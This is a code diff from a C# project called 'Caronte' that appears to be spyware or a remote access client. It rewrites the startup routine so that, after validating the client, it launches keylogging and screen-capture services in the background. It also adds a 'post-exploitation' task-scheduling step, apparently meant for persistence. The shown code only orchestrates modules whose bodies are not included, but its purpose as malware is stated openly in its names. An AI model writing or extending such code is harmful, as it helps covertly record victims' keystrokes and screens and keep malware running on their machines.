@@ -1,10 +1,11 @@
 ﻿using Caronte.Modules.Information;
 using Caronte.Modules.Information.GetClientInformation;
+using Caronte.Modules.PostExploitation;
 using Caronte.Modules.ValidateClient;
 using MediatR;
-using System.Collections.Generic;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Caronte
 {
@@ -19,21 +20,38 @@ namespace Caronte
             _cancellationToken = cancellationToken;
         }
 
-        private async Task Initialize()
+        public async Task Initialize()
         {
             var clientInformation = await _mediator.Send(new GetClientInformationQuery());
             var verifyAndCreateClientResponse = await _mediator.Send(new ValidateClientCommand() { ClientInformation = clientInformation.ResponseObject });
 
-            if (verifyAndCreateClientResponse.IsSucessFull)
+            if (!verifyAndCreateClientResponse.IsSucessFull)
             {
-                var tasksList = new List<Task>
-                {
-                    StartInformationServices.KeyboardLog(_cancellationToken, _mediator),
-                    StartInformationServices.PrintScreen(_cancellationToken, _mediator),
-                };
-
-                await Task.WhenAll(tasksList);
+                Application.Exit();
+                return;
             }
+
+            await RunTasks();
+        }
+
+        private async Task RunTasks()
+        {
+            RunInfiniteTasks();
+            await RunSingleExecutionTasks();
+        }
+
+        private void RunInfiniteTasks()
+        {
+            Task.Run(async () =>
+            {
+                await StartInformationServices.KeyboardLog(_cancellationToken, _mediator);
+                await StartInformationServices.PrintScreen(_cancellationToken, _mediator);
+            }, _cancellationToken);
+        }
+
+        private async Task RunSingleExecutionTasks()
+        {
+            await StartPostExploitationService.TaskSchedule(_cancellationToken, _mediator);
         }
     }
 }
